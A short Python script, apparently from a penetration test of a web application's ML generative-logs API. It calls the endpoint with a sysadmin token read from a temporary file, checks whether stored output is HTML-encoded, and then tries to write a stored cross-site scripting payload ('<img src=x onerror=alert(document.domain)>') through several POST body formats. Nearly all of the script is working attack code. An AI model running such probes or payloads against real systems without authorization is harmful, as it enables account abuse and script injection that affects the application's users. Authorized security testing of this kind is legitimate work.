import json,subprocess,os,time
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
def req(m,p,body=None):
    cmd=['curl','-s','-m','60','-o','/tmp/b','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== ml_generative_logs: what's stored, and is it encoded? ===")
c,b=req('GET','/api/v1/ml_generative_logs')
print(f"  {c} len={len(b)}")
try:
    logs=json.loads(b).get('ml_generative_logs') or []
    print(f"  rows: {len(logs)}")
    for l in logs:
        out=str(l.get('generated_output') or '')
        print(f"    id={l.get('id')} output_head={out[:90]!r}")
        print(f"      encoded={'&lt;' in out}  raw={'<h1' in out or '<p>' in out}")
        print(f"      keys={sorted(l.keys())}")
except Exception as e: print("  ",e)
print()
print("=== can I write a log entry with HTML? ===")
pay='<img src=x onerror=alert(document.domain)>ZXLOG'
for body in [{"generatedOutput":pay},{"generated_output":pay},
             {"ml_generative_log":{"generated_output":pay}}]:
    c,b=req('POST','/api/v1/ml_generative_logs',body)
    print(f"  {list(body.keys())} -> {c} {b[:120].replace(chr(10),' ')}")
